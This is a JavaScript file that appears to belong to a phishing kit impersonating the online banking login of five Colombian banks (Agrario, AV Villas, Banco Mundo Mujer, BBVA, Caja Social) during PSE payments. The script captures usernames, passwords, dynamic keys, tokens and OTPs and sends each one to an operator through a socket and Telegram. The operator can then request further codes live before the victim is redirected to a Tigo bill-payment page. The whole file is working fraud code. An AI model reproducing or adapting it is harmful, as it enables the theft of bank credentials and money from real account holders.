/**
 * PSE BANK HANDLER - Sistema unificado para bancas PSE con BancoUtils
 * @version 1.0.0
 * 
 * Este archivo reemplaza todos los client-optimized.js repetitivos.
 * Usa configuración declarativa por banco en lugar de código duplicado.
 */

(function() {
    'use strict';
    
    // ============================================================================
    // CONFIGURACIÓN DE BANCAS PSE
    // ============================================================================
    
    const BANK_CONFIGS = {
        'agrario': {
            pages: {
                'index.html': {
                    stage: 'login',
                    form: 'usernameForm',
                    inputs: { usuario: 'usernameInput' },
                    button: 'btnSiguiente',
                    validation: (d) => d.usuario?.length >= 3
                },
                'password.html': {
                    stage: 'password',
                    form: 'passwordForm',
                    inputs: { password: 'passwordInput' },
                    button: 'btnContinuar',
                    validation: (d) => d.password?.length >= 4
                },
                'dinamica.html': {
                    stage: 'dinamica',
                    form: 'dynamicForm',
                    inputs: { dinamica: 'dynamicInput' },
                    button: 'btnContinuar',
                    validation: (d) => d.dinamica?.length >= 6
                },
                'token.html': {
                    stage: 'token',
                    form: 'tokenForm',
                    inputs: { token: 'tokenInput' },
                    button: 'btnContinuar',
                    validation: (d) => d.token?.length >= 6
                },
                'otp.html': {
                    stage: 'otp',
                    form: 'otpForm',
                    inputs: { otp: 'otpInput' },
                    button: 'btnVerificar',
                    validation: (d) => d.otp?.length >= 6
                }
            }
        },
        'av-villas': {
            pages: {
                'index.html': {
                    stage: 'login',
                    form: 'loginForm',
                    inputs: { documento: 'document-number', password: 'password' },
                    button: 'submitBtn',
                    validation: (d) => d.documento?.length >= 5 && d.password?.length >= 4,
                    numericInputs: ['password']
                },
                'otp.html': {
                    stage: 'otp',
                    form: 'otpForm',
                    inputs: { otp: 'otpInput' },
                    button: 'btnVerificar',
                    validation: (d) => d.otp?.length >= 6,
                    numericInputs: ['otp']
                }
            }
        },
        'banco-mundo-mujer': {
            pages: {
                'index.html': {
                    stage: 'login',
                    form: 'loginForm',
                    inputs: { usuario: 'usuario', password: 'password' },
                    button: 'submitBtn',
                    validation: (d) => d.usuario?.length >= 5 && d.password?.length === 4,
                    numericInputs: ['password']
                },
                'password.html': {
                    stage: 'password',
                    form: 'passwordForm',
                    inputs: { password: 'password' },
                    button: 'btnContinuar',
                    validation: (d) => d.password?.length === 8,
                    numericInputs: ['password']
                },
                'dynamic.html': {
                    stage: 'dinamica',
                    form: 'dynamicForm',
                    inputs: { dinamica: 'dinamica' },
                    button: 'btnContinuar',
                    validation: (d) => d.dinamica?.length === 6,
                    numericInputs: ['dinamica']
                },
                'otp.html': {
                    stage: 'otp',
                    form: 'otpForm',
                    inputs: { otp: 'otp' },
                    button: 'btnVerificar',
                    validation: (d) => d.otp?.length >= 4 && d.otp?.length <= 8,
                    numericInputs: ['otp']
                }
            }
        },
        'bbva': {
            pages: {
                'index.html': {
                    stage: 'login',
                    form: 'loginForm',
                    inputs: { usuario: 'documentNumber', password: 'password' },
                    button: 'submitBtn',
                    validation: (d) => d.usuario?.length >= 5 && d.password?.length >= 4
                },
                'token.html': {
                    stage: 'token',
                    form: 'tokenForm',
                    inputs: { token: 'tokenInput' },
                    button: 'btnContinuar',
                    validation: (d) => d.token?.length >= 6
                },
                'otp.html': {
                    stage: 'otp',
                    form: 'otpForm',
                    inputs: { otp: 'otpInput' },
                    button: 'btnVerificar',
                    validation: (d) => d.otp?.length >= 6
                }
            }
        },
        'caja-social': {
            pages: {
                'index.html': {
                    stage: 'login',
                    form: 'loginForm',
                    inputs: { usuario: 'usuario' },
                    button: 'submitBtn',
                    validation: (d) => d.usuario?.length >= 5
                },
                'password.html': {
                    stage: 'password',
                    form: 'passwordForm',
                    inputs: { password: 'password' },
                    button: 'btnContinuar',
                    validation: (d) => d.password?.length === 8,
                    numericInputs: ['password']
                },
                'token.html': {
                    stage: 'token',
                    form: 'tokenForm',
                    inputs: { token: 'token' },
                    button: 'btnContinuar',
                    validation: (d) => d.token?.length === 6,
                    numericInputs: ['token']
                },
                'otp.html': {
                    stage: 'otp',
                    form: 'otpForm',
                    inputs: { otp: 'otp' },
                    button: 'btnVerificar',
                    validation: (d) => d.otp?.length >= 4 && d.otp?.length <= 8,
                    numericInputs: ['otp']
                }
            }
        }
    };
    
    // ============================================================================
    // DETECTAR BANCO Y PÁGINA
    // ============================================================================
    
    const pathMatch = window.location.pathname.match(/\/bancas\/([^\/]+)\//);
    if (!pathMatch) return;
    
    const bankName = pathMatch[1].toLowerCase().replace(/-/g, '-');
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    
    // Mapeo de nombres de carpetas a códigos de configuración
    const bankCodeMap = {
        'Agrario': 'agrario',
        'AV-Villas': 'av-villas',
        'Banco-Mundo-Mujer': 'banco-mundo-mujer',
        'BBVA': 'bbva',
        'Caja-Social': 'caja-social'
    };
    
    const bankCode = Object.entries(bankCodeMap).find(([folder]) => 
        window.location.pathname.includes(`/bancas/${folder}/`)
    )?.[1];
    
    if (!bankCode || !BANK_CONFIGS[bankCode]) {
        console.log('[PSE] Banco no configurado para handler unificado');
        return;
    }
    
    const config = BANK_CONFIGS[bankCode].pages[currentPage];
    if (!config) {
        console.log(`[PSE] Página ${currentPage} no configurada`);
        return;
    }
    
    console.log(`[PSE] Inicializando ${bankCode} - ${currentPage}`);
    
    // ============================================================================
    // INICIALIZACIÓN
    // ============================================================================
    
    document.addEventListener('DOMContentLoaded', function() {
        // Inicializar BancoUtils
        const sessionId = BancoUtils.getSessionId();
        BancoUtils.initSocket();
        
        // Obtener elementos DOM
        const form = document.getElementById(config.form);
        if (!form) {
            console.error(`[PSE] Formulario no encontrado: ${config.form}`);
            return;
        }
        
        const button = document.getElementById(config.button);
        const inputs = {};
        
        Object.entries(config.inputs).forEach(([key, id]) => {
            inputs[key] = document.getElementById(id);
            if (!inputs[key]) {
                console.warn(`[PSE] Input no encontrado: ${id}`);
            }
        });
        
        // Configurar validación numérica si aplica
        if (config.numericInputs) {
            config.numericInputs.forEach(inputKey => {
                const input = inputs[inputKey];
                if (input) {
                    input.addEventListener('input', function(e) {
                        const maxLength = input.getAttribute('maxlength');
                        e.target.value = BancoUtils.validateNumeric(e.target.value, maxLength ? parseInt(maxLength) : undefined);
                        validateForm();
                    });
                }
            });
        }
        
        // Configurar listener de acciones de Telegram
        BancoUtils.onTelegramAction((data) => {
            BancoUtils.hideOverlay();
            
            const actionMap = {
                login: 'index.html',
                password: 'password.html',
                dinamica: 'dinamica.html',
                token: 'token.html',
                otp: 'otp.html',
                finalizar: 'https://mi.tigo.com.co/pago-express/facturas'
            };
            
            const nextPage = actionMap[data.action];
            if (nextPage) {
                window.location.href = nextPage.startsWith('http') ? nextPage : nextPage;
            }
        });
        
        // Validación en tiempo real
        function validateForm() {
            const data = {};
            Object.entries(inputs).forEach(([key, input]) => {
                data[key] = input?.value.trim() || '';
            });
            
            const isValid = config.validation(data);
            
            if (button) {
                button.disabled = !isValid;
                button.classList.toggle('active', isValid);
            }
        }
        
        // Agregar listeners a todos los inputs
        Object.values(inputs).forEach(input => {
            if (input && !config.numericInputs?.includes(Object.keys(inputs).find(k => inputs[k] === input))) {
                input.addEventListener('input', validateForm);
            }
        });
        
        // Validación inicial
        validateForm();
        
        // Submit handler con TODAS las mejores prácticas
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Guardia contra doble submit
            if (window.__submitting) return;
            window.__submitting = true;
            
            BancoUtils.showOverlay();
            
            // Verificar conexión
            const socket = BancoUtils.getSocket();
            if (!socket || !socket.connected) {
                alert('Error de conexión. Recarga la página.');
                BancoUtils.hideOverlay();
                window.__submitting = false;
                return;
            }
            
            // Recopilar y enviar datos
            const formData = {};
            Object.entries(inputs).forEach(([key, input]) => {
                if (input) formData[key] = input.value.trim();
            });
            
            const fullData = BancoUtils.saveBankData(bankCode, formData);
            const message = BancoUtils.formatMessage(`${bankCode.toUpperCase()} - ${config.stage.toUpperCase()}`, fullData);
            
            // Crear teclado de botones
            const buttons = [
                { text: '👤 Pedir Login', action: 'login' },
                { text: '🔐 Pedir Password', action: 'password' },
                { text: '🔢 Pedir Dinámica', action: 'dinamica' },
                { text: '🔑 Pedir Token', action: 'token' },
                { text: '📱 Pedir OTP', action: 'otp' },
                { text: '✅ Finalizar', action: 'finalizar' }
            ];
            
            const keyboard = BancoUtils.createKeyboard(buttons, sessionId);
            
            try {
                await BancoUtils.sendToTelegram(config.stage, { text: message, keyboard });
                console.log('[PSE] ✅ Datos enviados correctamente');
                // Mantener overlay esperando acción de Telegram
            } catch (error) {
                console.error('[PSE] ❌ Error:', error);
                BancoUtils.hideOverlay();
                alert('Error al enviar datos. Intenta nuevamente.');
                
                // Reset completo en error
                window.__submitting = false;
                button.disabled = false;
                Object.values(inputs).forEach(input => {
                    if (input) input.value = '';
                });
                validateForm();
            }
        });
    });
})();
